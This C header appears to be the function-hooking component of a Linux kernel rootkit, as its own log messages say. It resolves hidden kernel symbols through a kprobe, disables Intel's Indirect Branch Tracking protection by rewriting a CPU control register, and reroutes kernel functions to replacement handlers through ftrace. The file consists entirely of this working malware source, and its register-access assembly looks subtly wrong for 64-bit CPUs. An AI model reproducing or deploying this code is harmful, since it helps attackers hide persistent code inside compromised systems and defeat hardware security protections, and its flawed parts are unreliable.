#ifndef FTRACE_HELPER_H
#define FTRACE_HELPER_H

#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/linkage.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

// ibt support bits
// goal: temporarily toggle ibt so certain hook flows work on ibt-enabled cpus
#define MSR_IA_S_CET        0x6a2
#define IBT_BIT_POSITION    2

static bool ibt_status = false;

// flip ibt on/off (best-effort)
static void ibt_toggle(void)
{
    u64 msr_value;

    if (!boot_cpu_has(X86_FEATURE_IBT))
    {
        return;
    }

    asm volatile ("rdmsr" : "=A"(msr_value) : "c"(MSR_IA_S_CET));
    msr_value ^= (1ULL << IBT_BIT_POSITION);
    asm volatile ("wrmsr" : : "c"(MSR_IA_S_CET), "A"(msr_value));
}

static bool ibt_is_on(void)
{
    u64 msr_value;

    if (!boot_cpu_has(X86_FEATURE_IBT))
    {
        return false;
    }

    asm volatile ("rdmsr" : "=A"(msr_value) : "c"(MSR_IA_S_CET));
    return test_bit(IBT_BIT_POSITION, (unsigned long *)&msr_value);
}

struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

// kallsyms_lookup_name resolver via kprobe
// keeps the callsite simple for kernels that don't export it directly
static unsigned long (*kallsyms_lookup_name_ptr)(const char *name);
static struct kprobe kp =
{
    .symbol_name = "kallsyms_lookup_name",
};

static int resolve_kallsyms(void)
{
    if (kallsyms_lookup_name_ptr)
    {
        return 0;
    }

    register_kprobe(&kp);
    kallsyms_lookup_name_ptr = (void *)kp.addr;
    unregister_kprobe(&kp);

    if (!kallsyms_lookup_name_ptr)
    {
        return -1;
    }

    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip,
                                    unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    // recursion guard: don't hook if we're already executing inside this module
    if (!within_module(parent_ip, THIS_MODULE))
    {
        regs->ip = (unsigned long)hook->function;
    }
}

static int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    // disable ibt if it's currently on
    ibt_status = ibt_is_on();
    if (ibt_status)
    {
        ibt_toggle();
    }

    if (resolve_kallsyms() < 0)
    {
        if (ibt_status)
        {
            ibt_toggle();
        }
        return -EFAULT;
    }

    for (i = 0; i < count; i++)
    {
        hooks[i].address = kallsyms_lookup_name_ptr(hooks[i].name);
        if (!hooks[i].address)
        {
            printk(KERN_ERR "rootkit: unresolved symbol: %s\n", hooks[i].name);
            continue;
        }

        // stash the real address into the caller-provided "original" slot
        *((unsigned long *)hooks[i].original) = hooks[i].address;

        hooks[i].ops.func  = fh_ftrace_thunk;
        hooks[i].ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                             FTRACE_OPS_FL_RECURSION |
                             FTRACE_OPS_FL_IPMODIFY;

        err = ftrace_set_filter_ip(&hooks[i].ops, hooks[i].address, 0, 0);
        if (err)
        {
            printk(KERN_ERR "rootkit: ftrace_set_filter_ip failed: %d\n", err);
        }

        err = register_ftrace_function(&hooks[i].ops);
        if (err)
        {
            printk(KERN_ERR "rootkit: register_ftrace_function failed: %d\n", err);
        }
    }

    // re-enable ibt if we disabled it
    if (ibt_status)
    {
        ibt_toggle();
    }

    return 0;
}

static void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    // match install behavior: toggle ibt the same way on entry/exit
    if (ibt_status)
    {
        ibt_toggle();
    }

    for (i = 0; i < count; i++)
    {
        unregister_ftrace_function(&hooks[i].ops);
        ftrace_set_filter_ip(&hooks[i].ops, hooks[i].address, 1, 0);
    }

    if (ibt_status)
    {
        ibt_toggle();
    }
}

#define HOOK(_name, _function, _original) \
{                                        \
    .name     = (_name),                 \
    .function = (_function),             \
    .original = (_original),             \
}

#endif